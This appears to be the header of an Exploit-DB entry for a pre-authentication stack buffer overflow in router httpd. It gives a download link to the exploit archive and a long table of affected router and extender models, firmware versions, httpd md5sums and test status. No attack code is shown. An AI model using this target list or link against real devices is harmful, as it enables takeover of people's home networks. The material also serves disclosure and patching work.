# EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/48588.zip
#
# Exploits a pre-authentication memcpy based stack buffer overflow vulnerability
# in httpd on several devices and versions:
#
#   Device      Version               httpd md5sum                      Exploit status
#   AC1450      V1.0.0.36_10.0.17     c105a629d55d3f7b29d6b88e2cc6ff3a  Untested
#   AC1450      V1.0.0.34_10.0.16     b01fa2155dbe3d37c0d244f2a258b797  Untested
#   AC1450      V1.0.0.22_1.0.10      8327b4ccf3c3ea1281f5beb932f308bb  Untested
#   AC1450      V1.0.0.14_1.0.6       a199bd85a19fbfe360e967c889fb0a83  Untested
#   AC1450      V1.0.0.8_1.0.4        c1f64b91722efa50452d6842a5e97f77  Untested
#   AC1450      V1.0.0.6_1.0.3        1b043477b16d5bbd2be3d4b7c4430953  Untested
#   D6220       V1.0.0.52_1.0.52      4c63e0a531ddf60310faf99702226c37  Untested
#   D6220       V1.0.0.48_1.0.48      2efa4dfdb0901ffe4b99555e2ddeca32  Untested
#   D6220       V1.0.0.46_1.0.46      2911f178060efcda3644be4bc7f25249  Untested
#   D6220       V1.0.0.44_1.0.44      3ea0dbb8e22d0e4daf3f12d5bb26ab64  Untested
#   D6220       V1.0.0.40_1.0.40      ef47f7085976c65890991eb67bbd31f7  Untested
#   D6220       V1.0.0.36_1.0.36      06c1b6ff9bac3e5c583f71f8cb63bd3a  Untested
#   D6220       V1.0.0.34_1.0.34      9a1fcd70a952b63ea874a826793e11ba  Untested
#   D6220       V1.0.0.32_1.0.32      5f9b38b2e4afcff3117f3f4d1bc454f4  Untested
#   D6220       V1.1.0.28_1.0.28      5fa7890b766cbd6233043a601bdc990c  Untested
#   D6220       V1.0.0.24_1.0.24      1d8cfa4843dd9c4f1b1360beca080a81  Untested
#   D6220       V1.0.0.22_1.0.22      3d1916d41b6e1e728238e5def8723b3e  Untested
#   D6220       V1.0.0.16_1.0.16      d5d19a4e7ba57850e4c09a01766cde3a  Untested
#   D6300       V1.0.0.102_1.0.102    8dd49d875e2683e396dc67381fadd057  Tested
#   D6300       V1.0.0.96_1.1.96      5caa6056af76330fc0292657f192cb69  Untested
#   D6300       V1.0.0.90_1.0.90      6196e4b48c9337fd5b89f527262f81dc  Tested
#   D6300       V1.0.0.88-1.0.88      d65d7d6db8a240bed2c845f9ce5ef8ed  Untested
#   D6300       V1.0.0.76_1.0.76      b4c98cc8ff8d9cd3c4a1f65c5c5f0fde  Untested
#   D6300       V1.0.0.72_1.0.72      d0690f900a0fa29b38266b04de51869e  Untested
#   D6300       V1.0.0.42_1.0.42      e86b7593f1e6d59f49fe4948379d0d69  Untested
#   D6300       V1.0.0.30_1.0.30      f3691a3179fcd7390b62398f365a4c1a  Untested
#   D6300       V1.0.0.24_1.0.24      33cad70c5c307950fffded6c8f64066b  Untested
#   D6300       V1.0.0.16_1.0.16      55f4d6ac42eff8014254eadce033faac  Untested
#   D6400       V1.0.0.88_1.0.88      a9a31bd500dc6542969e039283b4f44f  Untested
#   D6400       V1.0.0.86_1.0.86      6ef83c99c829dc7e7d0a0907d3ed71a8  Untested
#   D6400       V1.0.0.82_1.0.82      33c63fc65ecba162e8acbb85bed0dda0  Untested
#   D6400       V1.0.0.80_1.0.80      4d9a3533b6e7afddfb2060649e44d092  Untested
#   D6400       V1.0.0.78_1.0.78      6de4a742f7c7edd7241deda0fdfd5ab4  Untested
#   D6400       V1.0.0.74_1.0.74      e692a2670b133efb293ecc3e3f9c82b4  Untested
#   D6400       V1.0.0.70_1.0.70      a9a0cd9ebb6e45671b03a291f79cfaf0  Untested
#   D6400       V1.0.0.68_1.0.68      226c662ecbf01f524cf0c0537220d652  Untested
#   D6400       V1.0.0.66_1.0.66      a1986e8fe5c270d2e8a3f9416b086a85  Untested
#   D6400       V1.0.0.60_1.0.60      1f74db16784172b4e8b385149b7b730c  Untested
#   D6400       V1.0.0.58_1.0.58      e62704fc3cec8611afc65643564943d2  Untested
#   D6400       V1.0.0.56_1.0.56      b02401e956d4160c59a2f59a31da51bc  Untested
#   D6400       V1.0.0.54_1.0.54      632e9d26af86341f2eea25248e298b8c  Untested
#   D6400       V1.0.0.52_1.0.52      c54e25d1dcd814c44ee29b26337ca140  Untested
#   D6400       V1.0.0.44_1.0.44      9b5cca485ed56ade5cb3d556c8bb975b  Untested
#   D6400       V1.0.0.38_1.1.38      b5729e40e61563f7a1a29359e0f9c78c  Untested
#   D6400       V1.0.0.34_1.3.34      5628ae2ce9326a63b050e96b6aa3fb79  Untested
#   D6400       V1.0.0.22_1.0.22      1dc99a4d0952f648f1dab07d5cdd2a60  Untested
#   D7000v2     V1.0.0.56_1.0.1       a35f742d1d7ebf7c882fa71bc6cd4d74  Untested
#   D7000v2     V1.0.0.53_1.0.2       27d115ede639511d2eda25114dd82a5b  Untested
#   D7000v2     V1.0.0.52_1.0.1       827190546bcae129c56334674af3f669  Untested
#   D7000v2     V1.0.0.51_1.0.1       0583d3f1fd97d3616a9e1448be12ee16  Untested
#   D7000v2     V1.0.0.47_1.0.1       4880a731183fce2b4d47c5064c6d7236  Untested
#   D7000v2     V1.0.0.45_1.0.1       2f1bc9a39d033d10c9ae73c299353524  Untested
#   D7000v2     V1.0.0.44_1.0.1       7d37548ceda1aeb2a163b9616ecfc156  Untested
#   D7000v2     V1.0.0.40_1.0.1       095c32dae5741f5342f5b5aaeeac6206  Untested
#   D7000v2     V1.0.0.38_1.0.1       acca219a67790af0897f8ca6f1bd949f  Untested
#   D8500       V1.0.3.44_1.0.1       24352845696378cb0bcef38414d5640a  Untested
#   D8500       V1.0.3.43_1.0.1       b71e3b8eb1aedd615aafc9311dd36886  Untested
#   D8500       V1.0.3.42_1.0.1       a567caf426cc76cd11ec3c3053519c8f  Untested
#   D8500       V1.0.3.39_1.0.1       ff56ddb8126f5aa1dfc4d85d2eeafce4  Untested
#   D8500       V1.0.3.36_1.0.1       862a04b37c61fa9cadff8754d9f3abb2  Untested
#   D8500       V1.0.3.35_1.0.1       16d4ab7b3357bda7e68a79b5b9022c4d  Untested
#   D8500       V1.0.3.28_1.0.1       94bbb72e108e68a774746a97cc7c00c0  Untested
#   D8500       V1.0.3.27_1.0.1       822427e336366dd83c018e541d1d2d4f  Untested
#   D8500       V1.0.3.25_1.0.1       ddd3c3f02d1286f26344265d6db1bea5  Untested
#   DC112A      V1.0.0.44_1.0.60      e4721b08c70fcdc3dd1048cee49c2118  Untested
#   DC112A      V1.0.0.30_1.0.60      c11c0fb597c234e682fbbf3f5ba00d90  Untested
#   DC112A      V1.0.0.24_1.0.60      b2b677dff87eab44b4972ff4948532e6  Untested
#   DGN2200     V1.0.0.58_7.0.57      db21e42ca1bf1878192fa7b1627b065a  Tested
#   DGN2200     V1.0.0.57_7.0.57      b5e9360ea0411e3e01e2901ec1c14c61  Untested
#   DGN2200     V1.0.0.55_7.0.55      5853a3a4aa466ad491b23d2a59759f67  Untested
#   DGN2200     V1.0.0.52_7.0.52      8286b50e5598cf314aa15d0ce204e36c  Untested
#   DGN2200     V1.0.0.50_7.0.50NA    6e37ab74491954b2763bdb6214848045  Untested
#   DGN2200     V1.0.0.36_7.0.36NA    3ab21af915088055bcdfc5ade0af2c2c  Untested
#   DGN2200     V1.0.0.36_7.0.36      75a601e25219af4cf8a0c0978a3a1d71  Untested
#   DGN2200v4   V1.0.0.110_1.0.110    5a8772a24aac9d15128bf928d748c1ab  Untested
#   DGN2200v4   V1.0.0.108_1.0.108    2ce2f58da92aba784e0d54e2b6ddfc22  Untested
#   DGN2200v4   V1.0.0.102_1.0.102    c7f92c42a258d6e8eadcb9335f25afdb  Tested
#   DGN2200v4   V1.0.0.98_1.0.98      ce7f84170d80046146076c0212c46b22  Untested
#   DGN2200v4   V1.0.0.90_1.0.90      fad68b99a9fb2eab63cbfc6b56951d82  Untested
#   DGN2200v4   V1.0.0.86_1.0.86      6a81f9a1c610a9884308d58faf36e5a7  Untested
#   DGN2200v4   V1.0.0.82_1.0.82      adfeaa24b82ff7a9ae3ce4a779f32240  Untested
#   DGN2200v4   V1.0.0.76_1.0.76      6ca6a23431ea41ed6fbb2c71dc6d46f8  Untested
#   DGN2200v4   V1.0.0.66_1.0.66      52e293aea6c51a08be9e00aa653217e2  Untested
#   DGN2200v4   V1.0.0.62_1.0.62      e88ebcec9d158dfaf557c996a6034edc  Untested
#   DGN2200v4   V1.0.0.58_1.0.58      a7a3412bc7608971b6a0bf47c95a56d6  Untested
#   DGN2200v4   V1.0.0.46_1.0.46      603daa3cedb8c6269257416c27f1e55b  Untested
#   DGN2200v4   V1.0.0.24_5.0.8       a9151f0c434e6b27135b628a8cf51134  Untested
#   DGN2200v4   V1.0.0.5_5.0.3        4668835a74ecab6333889d7efe171361  Untested
#   DGN2200M    V1.0.0.37_1.0.21WW    87fbe2fa75d8acdee8022f71629d7d79  Tested
#   DGN2200M    V1.0.0.35_1.0.21WW    ffd47e9d882ce4f3de11df49ce7a535b  Tested
#   DGN2200M    V1.0.0.35_1.0.21NA    a8edc9e918fde432f6979af0ea77aeb6  Untested
#   DGN2200M    V1.0.0.33_1.0.21WW    6868b9bd17a5a47c739c0bf68dc04875  Untested
#   DGN2200M    V1.0.0.33_1.0.21NA    d8ddd5aef65509ee95239135aa3dfc71  Untested
#   DGN2200M    V1.0.0.26_1.0.20WW    b2942e856d5690962d7b39d585d63c2d  Untested
#   DGN2200M    V1.0.0.24_1.0.20NA    3cf45d175d4151dadd8d2823b7222121  Untested
#   DGND3700    V1.0.0.17_1.0.17      b103c87de279c008bfd9793fb808125e  Untested
#   DGND3700    V1.0.0.17_1.0.17NA    d88c70428a629ae3a899628e4d0d7f2c  Untested
#   DGND3700    V1.0.0.12_1.0.12      83fabbde0e49ab07a5ab77a94a5dd0d4  Untested
#   DGND3700    V1.0.0.12_1.0.12NA    c6735900e4239a2a474f82fea6b2bf2f  Untested
#   EX3700      V1.0.0.78_1.0.51      456b1fdd776007c0999a6b5cc85ea4e0  Untested
#   EX3700      V1.0.0.76_1.0.49      cd4e4e9179569fafa3c406cf48d4ee2c  Untested
#   EX3700      V1.0.0.72_1.0.47      3556b3a666c781dbed7d6d6304ae34b5  Untested
#   EX3700      V1.0.0.70_1.0.46      a0e1573c0e8dbd9ae43ab07e1e4bddd7  Untested
#   EX3700      V1.0.0.68_1.0.45      d26b6062d6e75fee8109e67572cdcc26  Untested
#   EX3700      V1.0.0.64_1.0.43      d665edd51692e539592b5e1667eef22c  Untested
#   EX3700      V1.0.0.62_1.0.42      9e753ac547229b6a3df28f03115a8d31  Untested
#   EX3700      V1.0.0.58_1.0.38      67ab1cac6cbf6d074cea95fadca461ab  Untested
#   EX3700      V1.0.0.50_1.0.30      26bf966c3dc6143f126ccc6d4e016b0b  Untested
#   EX3700      V1.0.0.48_1.0.28      df8012bd7cf20db8592aaacf6b634691  Untested
#   EX3700      V1.0.0.46_1.0.26      e9416497850099b1f851d52bbb5f520c  Untested
#   EX3700      V1.0.0.44_1.0.22      30323764937bae52d93184f3b521783a  Untested
#   EX3700      V1.0.0.34_1.0.22      37c8368144211c8f73d7be9a9f6dacb2  Untested
#   EX3700      V1.0.0.28_1.0.20      d7e6b85d140f09f08ce3129dc88918c2  Untested
#   EX3700      V1.0.0.26_1.0.19      bc0c9df4ed9424c0d3b94bf78db594c0  Untested
#   EX3700      V1.0.0.24_1.0.18      64e7797362fe0b58c4eb71758b8fa5bf  Untested
#   EX3700      V1.0.0.22_1.0.17      ee6f11943d1cd33f87f6fddd01917f96  Untested
#   EX3800      V1.0.0.78_1.0.51      456b1fdd776007c0999a6b5cc85ea4e0  Untested
#   EX3800      V1.0.0.76_1.0.49      cd4e4e9179569fafa3c406cf48d4ee2c  Untested
#   EX3800      V1.0.0.72_1.0.47      3556b3a666c781dbed7d6d6304ae34b5  Untested
#   EX3800      V1.0.0.70_1.0.46      a0e1573c0e8dbd9ae43ab07e1e4bddd7  Untested
#   EX3800      V1.0.0.68_1.0.45      d26b6062d6e75fee8109e67572cdcc26  Untested
#   EX3800      V1.0.0.64_1.0.43      d665edd51692e539592b5e1667eef22c  Untested
#   EX3800      V1.0.0.62_1.0.42      9e753ac547229b6a3df28f03115a8d31  Untested
#   EX3800      V1.0.0.58_1.0.38      67ab1cac6cbf6d074cea95fadca461ab  Untested
#   EX3800      V1.0.0.50_1.0.30      26bf966c3dc6143f126ccc6d4e016b0b  Untested
#   EX3800      V1.0.0.48_1.0.28      df8012bd7cf20db8592aaacf6b634691  Untested
#   EX3800      V1.0.0.46_1.0.26      e9416497850099b1f851d52bbb5f520c  Untested
#   EX3800      V1.0.0.44_1.0.22      30323764937bae52d93184f3b521783a  Untested
#   EX3800      V1.0.0.34_1.0.22      37c8368144211c8f73d7be9a9f6dacb2  Untested
#   EX3800      V1.0.0.28_1.0.20      d7e6b85d140f09f08ce3129dc88918c2  Untested
#   EX3800      V1.0.0.26_1.0.19      bc0c9df4ed9424c0d3b94bf78db594c0  Untested
#   EX3920      V1.0.0.78_1.0.51      456b1fdd776007c0999a6b5cc85ea4e0  Untested
#   EX3920      V1.0.0.76_1.0.49      cd4e4e9179569fafa3c406cf48d4ee2c  Untested
#   EX3920      V1.0.0.72_1.0.47      3556b3a666c781dbed7d6d6304ae34b5  Untested
#   EX3920      V1.0.0.70_1.0.46      a0e1573c0e8dbd9ae43ab07e1e4bddd7  Untested
#   EX3920      V1.0.0.68_1.0.45      d26b6062d6e75fee8109e67572cdcc26  Untested
#   EX3920      V1.0.0.64_1.0.43      d665edd51692e539592b5e1667eef22c  Untested
#   EX3920      V1.0.0.62_1.0.42      9e753ac547229b6a3df28f03115a8d31  Untested
#   EX3920      V1.0.0.58_1.0.38      67ab1cac6cbf6d074cea95fadca461ab  Untested
#   EX3920      V1.0.0.50_1.0.30      26bf966c3dc6143f126ccc6d4e016b0b  Untested
#   EX3920      V1.0.0.48_1.0.28      df8012bd7cf20db8592aaacf6b634691  Untested
#   EX3920      V1.0.0.46_1.0.26      e9416497850099b1f851d52bbb5f520c  Untested
#   EX3920      V1.0.0.44_1.0.22      30323764937bae52d93184f3b521783a  Untested
#   EX3920      V1.0.0.34_1.0.22      37c8368144211c8f73d7be9a9f6dacb2  Untested
#   EX3920      V1.0.0.28_1.0.20      d7e6b85d140f09f08ce3129dc88918c2  Untested
#   EX3920      V1.0.0.26_1.0.19      bc0c9df4ed9424c0d3b94bf78db594c0  Untested
#   EX6000      V1.0.0.38_1.0.22      fa48d3a1d76f0141022b70b37a139bfb  Untested
#   EX6000      V1.0.0.32_1.0.18      b119eb091db312c9223291cc12608bc4  Untested
#   EX6000      V1.0.0.30_1.0.17      a4988eb60c3b548c8117ff79a4e0601e  Untested
#   EX6000      V1.0.0.28_1.0.16      dc2b1eb141909690af81ef5690cc5912  Untested
#   EX6000      V1.0.0.24_1.0.14      26077a4cdaf21b6ba0d886ea070ce8d7  Untested
#   EX6000      V1.0.0.20_1.0.11      f17de59371f715b6735f0f7f8c9042e9  Untested
#   EX6000      V1.0.0.10_1.0.6       e507e02386a634b092be4a5e2118e7b1  Untested
#   EX6100      V1.0.2.24_1.1.134     6fde4f0259baeb6a3680fb9796b920ab  Tested
#   EX6100      V1.0.2.18_1.1.131     5baa9a7007dff6000bf143231e8f43ce  Untested
#   EX6100      V1.0.2.16_1.1.130     ee1efa975138f748fbbb21a450b956a9  Untested
#   EX6100      V1.0.2.6_1.1.120      f5a6e0de947f281261b0078fa306e631  Untested
#   EX6100      V1.0.1.36_1.0.114     a1b3591183bc3f75dc280f0565b2c2c9  Untested
#   EX6100      V1.0.0.28_1.0.66      7a39f661c1c6e7f3168dd9e805283f12  Tested
#   EX6100      V1.0.0.22_1.0.51      0bb3870ff95764b2cd600c673d81af8e  Untested
#   EX6120      V1.0.0.48_1.0.30      e05613c38204f66c1c8003f5ec4bde0d  Untested
#   EX6120      V1.0.0.46_1.0.29      46a4c7f6f054665bed444c2f536b7bf0  Untested
#   EX6120      V1.0.0.42_1.0.27      ddbaa705a3e54cf361735c559e500494  Untested
#   EX6120      V1.0.0.40_1.0.25      9d6ad5117207ffeda165dea3f9bb4f73  Untested
#   EX6120      V1.0.0.36_1.0.23      cfdfa436b024e95d53630fd71f46c48e  Untested
#   EX6120      V1.0.0.32_1.0.21      58866ce4c45337157d573d904e2a4052  Untested
#   EX6120      V1.0.0.30_1.0.20      817c93296f8149f6a8e41ef501918509  Untested
#   EX6120      V1.0.0.28_1.0.18      feb144c0a06e2251647ff8a8bb88704b  Untested
#   EX6120      V1.0.0.26_1.0.16      90c4e8c9ef5c03e09989caf944a80cf3  Untested
#   EX6120      V1.0.0.16_1.0.11      8f388e0ee15e32f9b7ee46d49d8e9ea2  Untested
#   EX6120      V1.0.0.14_1.0.10      b6e59d1ef530c60a9ba03b8b28784cca  Untested
#   EX6120      V1.0.0.8_1.0.4        be69b611410dee663ca081d23e56cc9b  Untested
#   EX6120      V1.0.0.4_1.0.2        368cbc774798fb5233f82cb02277213b  Untested
#   EX6130      V1.0.0.30_1.0.17      947f815e4a2fe0678e7dd67c4b10cc99  Untested
#   EX6130      V1.0.0.28_1.0.16      20db4ec9dfa72f0a3a6e5574b5663cb7  Untested
#   EX6130      V1.0.0.24_1.0.14      355fe4afe7c8c017ed8048f39e3ad1e3  Untested
#   EX6130      V1.0.0.22_1.0.13      6b87f60aa1ea4c6d9d44f2e8f32fc2aa  Untested
#   EX6130      V1.0.0.20_1.0.12      428b183f162edddacb3c4d4da0a2ecd6  Untested
#   EX6130      V1.0.0.16_1.0.10      ede8953a631f5315085bfcbc50ac0534  Untested
#   EX6130      V1.0.0.12_1.0.7       a1485ffd1b0afa2430c8ceb860fd12c8  Untested
#   EX6150      V1.0.0.42_1.0.73      f826bb5b4850ec73c3c5522db0d9f3bb  Untested
#   EX6150      V1.0.0.34_1.0.69      ff4a9ac154f6dc5c58d8ee72c847d6dc  Untested
#   EX6150      V1.0.0.32_1.0.68      baf6e6074326d8da71b5e81d59fd2bbc  Untested
#   EX6150      V1.0.0.28_1.0.64      4209003e1c1c481ad66679918ccefd41  Untested
#   EX6150      V1.0.0.16_1.0.58      56f1fa5cddc9a714796fd671e95d12ce  Untested
#   EX6150      V1.0.0.14_1.0.54      067b3adcde96e80e0bcc11ed9c846459  Untested
#   EX6200      V1.0.3.90_1.1.125     884de197aa849e668ac7810561e92265  Untested
#   EX6200      V1.0.3.88_1.1.123     6c183bb1b9b025cb30496dee0d9ab473  Untested
#   EX6200      V1.0.3.82_1.1.117     91e4f5f7fd02adb693b79572a2f887a0  Untested
#   EX6200      V1.0.3.76_1.1.111     c20025474fb29a28dc45e7b2c4566421  Untested
#   EX6200      V1.0.3.74_1.1.109     c7e0ea632820e9674165190d2f7d8a57  Untested
#   EX6200      V1.0.3.68_1.1.104     4fce79801c0ad403df3d627c0d3cc290  Untested
#   EX6200      V1.0.1.60_1.1.98      49b23634828219d28739195b491749de  Untested
#   EX6200      V1.0.0.52_1.1.90      dc12bb1fb624fd72625f951d829c84be  Untested
#   EX6200      V1.0.0.46_1.1.70      49b158f381a21555d0c715c6e7c33d64  Untested
#   EX6200      V1.0.0.42_1.1.57      4024cd22371a955861589cfdca67014d  Untested
#   EX6200      V1.0.0.38_1.1.52      2e6e9debfe5b93d54e18ec8f04a43480  Untested
#   EX6920      V1.0.0.40_1.0.25      9d6ad5117207ffeda165dea3f9bb4f73  Untested
#   EX6920      V1.0.0.36_1.0.23      cfdfa436b024e95d53630fd71f46c48e  Untested
#   EX6920      V1.0.0.32_1.0.21      58866ce4c45337157d573d904e2a4052  Untested
#   EX6920      V1.0.0.30_1.0.20      817c93296f8149f6a8e41ef501918509  Untested
#   EX6920      V1.0.0.28_1.0.18      feb144c0a06e2251647ff8a8bb88704b  Untested
#   EX6920      V1.0.0.26_1.0.16      90c4e8c9ef5c03e09989caf944a80cf3  Untested
#   EX6920      V1.0.0.16_1.0.11      8f388e0ee15e32f9b7ee46d49d8e9ea2  Untested
#   EX6920      V1.0.0.14_1.0.10      b6e59d1ef530c60a9ba03b8b28784cca  Untested
#   EX6920      V1.0.0.8_1.0.4        be69b611410dee663ca081d23e56cc9b  Untested
#   EX6920      V1.0.0.4_1.0.2        368cbc774798fb5233f82cb02277213b  Untested
#   EX7000      V1.0.1.84_1.0.148     769b68e697516fd40645e85266276844  Untested
#   EX7000      V1.0.1.80_1.0.144     df02a32c3e8dfe22a0e10adf8f9cfa9d  Untested
#   EX7000      V1.0.1.78_1.0.140     cf3939b5cd5f3379084c164f0ab85ea5  Untested
#   EX7000      V1.0.0.66_1.0.126     13ddf3f666fe43a4c988babf54861292  Untested
#   EX7000      V1.0.0.62_1.0.122     ce6c2f13b057873db9fec0f7fdc86b5b  Untested
#   EX7000      V1.0.0.58_1.0.112     0b988da5188b0c2712a8414f34f68152  Untested
#   EX7000      V1.0.0.56_1.0.108     40ce1aadf9810780d9b9d1cc6dd27a29  Untested
#   EX7000      V1.0.0.50_1.0.102     f862e5ae2823f9187580796c90dd388b  Untested
#   EX7000      V1.0.0.42_1.0.94      be8bd31d14825930b8f6f9e4005b436e  Untested
#   EX7000      V1.0.0.38_1.0.91      04c5f1f03a3ed1491519c450e73a30df  Untested
#   EX7000      V1.0.0.36_1.0.88      ed80bd32dc66f080d962295130c7665c  Untested
#   EX7000      V1.0.0.32_1.0.84      00376a5055221c56217a93e41a5ef9c9  Untested
#   EX7000      V1.0.0.30_1.0.72      e182cad2e1d3bfbc33142141958e62f5  Untested
#   LG2200D     V1.0.0.57_1.0.40      c788662b93484b512c97147f5e008ff9  Untested
#   MBM621      V1.1.3                4ac9ddde0b40da6b2f8c9e66d7cb3560  Untested
#   MBR624GU    V6.01.30.64WW         367530253434926de55988a08e517828  Untested
#   MBR624GU    V6.01.30.61WW         7319b8c9ca2335024693e4f6ad02dfb1  Untested
#   MBR624GU    V6.01.30.59WW         6a78396265425537f2b15473d7f4fff6  Untested
#   MBR624GU    V6.01.30.59NA         e4d0ec49da0956cc8b0fb7ff9461be4f  Untested
#   MBR624GU    V6.00.30.46WW         6f984aa8e172204310226fdee94ab938  Untested
#   MBR624GU    V6.00.28.43WW         e10b0ab92c8edc94975b345a102ef145  Untested
#   MBR624GU    V6.00.28.43NA         5c3e39fed6d914a836c99c397b3f1ec1  Untested
#   MBR624GU    V6.00.26.21WW         ab6b6f1635dc27a6a93c5f172496286a  Untested
#   MBR624GU    V6.00.22.14NA         bafc32d9dc20f686f3162b263f391df6  Untested
#   MBR624GU    V6.00.22.12           7fe0d93833ffe7f74bc829e1054c8312  Untested
#   MBR1200     V1.2.2.53             3ed99932142ee830544022ed0582e1d1  Untested
#   MBR1515     V1.2.2.68             623d9ee0386c50c122fce6f3d6497c94  Untested
#   MBR1516     V1.2.2.84BM           cbf78bd7d7ee6c7a3a5375ae6dc07cec  Untested
#   MBRN3000    V1.0.0.74_2.0.12WW    d496c9abe19b706d688fe11f9d48244f  Untested
#   MBRN3000    V1.0.0.72_2.0.12WW    0e5c04a9053070fbe09501ebd45148fb  Untested
#   MBRN3000    V1.0.0.72_2.0.12NA    f5166bb95613b2c32d4a22b31adea533  Untested
#   MBRN3000    V1.0.0.69_2.0.12WW    621647d9b23d6484c11d35ba8b28fc41  Untested
#   MBRN3000    V1.0.0.69_2.0.12NA    df4a8e61a3573f08e0f7e3c3a4925d45  Untested
#   MBRN3000    V1.0.0.65_2.0.12WW    73f3a1d64c334e947cb5ca1f39f69301  Untested
#   MBRN3000    V1.0.0.65_2.0.12NA    d3ba7bcc00b3d09a72e0b1992c3fcdc4  Untested
#   MBRN3000    V1.0.0.43NA           cad281cfc42d26ffd88762d24074577b  Untested
#   MVBR1210C   V1.2.0.35BM           b36a65b43d84f12254ead93484e64691  Untested
#   R4500       V1.0.0.4_1.0.3        eb878ea3ee999ebd2697d3a1ea6844b0  Untested
#   R6200       V1.0.1.58_1.0.44      c5eb9a42ecad8deb05cdcfbba948489e  Untested
#   R6200       V1.0.1.56_1.0.43      b9ba700570eece0317d2d7e6f69375b1  Untested
#   R6200       V1.0.1.52_1.0.41      d6fd17a8d8dec0cd65f85cf3b423b618  Untested
#   R6200       V1.0.1.48_1.0.37      ba22d5de1d45e7b27ef02b54d76109c1  Untested
#   R6200       V1.0.1.46_1.0.36      3b5ac031b2756daf2a22879750887491  Untested
#   R6200       V1.0.0.28_1.0.24      32748ac05aed521902cdc94c79a9c7d0  Untested
#   R6200       V1.0.0.18_1.0.18      b1e6175e31617dad54a2ebbdc0a0df6c  Untested
#   R6200v2     V1.0.3.12_10.1.11     0b0df46df490bb452369a8b2a8075039  Untested
#   R6200v2     V1.0.3.10_10.1.10     8baf6ea213db77e77888566ceeb39ac1  Untested
#   R6200v2     V1.0.1.20_1.0.18      e11bba1b0c9d7c882da165188d16a83b  Untested
#   R6200v2     V1.0.1.18_1.0.17      5b11e221cee499d20a0615461622ac79  Untested
#   R6200v2     V1.0.1.16_1.0.15      b507812655353cc7ea1c95da7816f820  Untested
#   R6200v2     V1.0.1.14_1.0.14      5076ce08e5bcaba94e510213e59bfff3  Untested
#   R6250       V1.0.4.38_10.1.30     c84cc113aae5aa5a8e540898bda5bd5f  Untested
#   R6250       V1.0.4.36_10.1.30     216a9f879e881b5ae467790761c87ebd  Tested
#   R6250       V1.0.4.34_10.1.28     0dc8a4bab30dbbe4d8afcfcb360187ad  Untested
#   R6250       V1.0.4.26_10.1.23     3f1be99b50d35864d70d2aee5ecc33c6  Untested
#   R6250       V1.0.4.20_10.1.20     2403a8ce4d04a584b19f0cf30f92bf56  Untested
#   R6250       V1.0.4.16_10.1.18     fe6030d67f0a055903e55d405cb91e20  Untested
#   R6250       V1.0.4.14_10.1.17     e0dc56338e8f16c1c38c0845291dafda  Untested
#   R6250       V1.0.4.12_10.1.15     0bc26be95cded31e5453d482085e723c  Untested
#   R6250       V1.0.4.8_10.1.13      8424c65f442d90638a6d0fc9bcf83d35  Untested
#   R6250       V1.0.4.6_10.1.12      356b523cb24085686b65769e1872a583  Untested
#   R6250       V1.0.4.2_10.1.10      4f119505aa1ad2c66db91ee74693442a  Untested
#   R6250       V1.0.3.12_10.1.8      c5ae345bf1d4b790df115ce17a1e2629  Untested
#   R6250       V1.0.3.6_10.1.3       309fefe7f4c6e451adca8339107e3794  Untested
#   R6250       V1.0.1.84_1.0.78      7dfdbdc609b182d6923f486f4d9c5283  Tested
#   R6250       V1.0.1.82_1.0.77      d3cb80a6d4e32ac12a6ca996860179c7  Untested
#   R6250       V1.0.1.80_1.0.75      cb32448faaa7dfc9031e82a80e3c6366  Untested
#   R6250       V1.0.0.72_1.0.71      e8870c350aa8b1831de04528313b4597  Untested
#   R6250       V1.0.0.70_1.0.70      8da51e46e4a0c8ce73b07afbcd4580f3  Untested
#   R6250       V1.0.0.62_1.0.62      c086bcb2c79cf35f4369cf6a99f1c8a5  Untested
#   R6300       V1.0.2.80_1.0.59      5fc46dc531417ecd3a45c7fbe23b2c99  Untested
#   R6300       V1.0.2.78_1.0.58      ae302b1749a6d3462aa218c71b319ec4  Untested
#   R6300       V1.0.2.76_1.0.57      a613643bbce2cec3c79f8f5896de9d9d  Untested
#   R6300       V1.0.2.70_1.0.50      43075b37dd29c100d412ef91bc26130e  Untested
#   R6300       V1.0.2.68_1.0.49      647341220a8706d9dc7c6023a7520f6e  Untested
#   R6300       V1.0.2.38_1.0.33      937ad68339a92c3672b205d26b29f348  Untested
#   R6300       V1.0.2.36_1.0.28      9cceb9d7c494c68304babd23fda58a13  Untested
#   R6300       V1.0.2.26_1.0.26      f44aba5cddc36eedebb08a74b40793db  Untested
#   R6300       V1.0.2.14_1.0.23      d9ce4aca0e55a0777083351958ad939c  Untested
#   R6300       V1.0.2.10_1.0.21      f8ae0c63ea66511e3f8e006d44236e5c  Untested
#   R6300       V1.0.0.90_1.0.18      87bb9b3375847616e30db052708b8442  Untested
#   R6300       V1.0.0.68_1.0.16      f6276b5a3a319c423cb0bf6578098775  Untested
#   R6300v2     V1.0.4.36_10.0.93     ad739a306344ba53c23dcec60b1f25ec  Untested
#   R6300v2     V1.0.4.34_10.0.92     e493f182ecd746d3de18df040a95211a  Untested
#   R6300v2     V1.0.4.32_10.0.91     0842fa456950808a355edb18795112b6  Tested
#   R6300v2     V1.0.4.28_10.0.89     f4ae7abd7bff63b66f096255e4c428ca  Untested
#   R6300v2     V1.0.4.24_10.0.87     e05be33f9f55986c8f606be892fffc69  Untested
#   R6300v2     V1.0.4.8_10.0.77      d6c9b72c67535e159ea7af739cd07926  Untested
#   R6300v2     V1.0.4.6_10.0.76      a3d4fe0c8e7cd91a40724e9c7464fdf6  Untested
#   R6300v2     V1.0.4.2_10.0.74      00f2196125d61b53ffd16dccaa7fde83  Untested
#   R6300v2     V1.0.3.30_10.0.73     00c15e4a4cde88faaf3875914f959a2d  Untested
#   R6300v2     V1.0.3.28_10.0.71     cdb52e60dc2aaf5ca0944131451bad70  Untested
#   R6300v2     V1.0.3.26_10.0.70     3c05bff70e44fa9458739e260d3cb647  Untested
#   R6300v2     V1.0.3.22_10.0.67     6cda020fed0ae522671c15f7620c531f  Untested
#   R6300v2     V1.0.3.8_1.0.60       69637d313345d7d73d8f853ef2cac2b4  Tested
#   R6300v2     V1.0.3.6_1.0.63CH     2871ac95aea8f1907ab2cce316a6dee9  Tested
#   R6300v2     V1.0.3.2_1.0.57       e127e31093baddeee0b445dfb5b0585c  Untested
#   R6300v2     V1.0.2.86_1.0.51      67b4667c4f4d5a46a29bef1a705526ac  Untested
#   R6300v2     V1.0.2.72_1.0.46      b1edb9bbc305d22110f9231892784e3d  Untested
#   R6300v2     V1.0.1.72_1.0.21      907ce31e0d0c1a81f7f39b152490bb6c  Untested
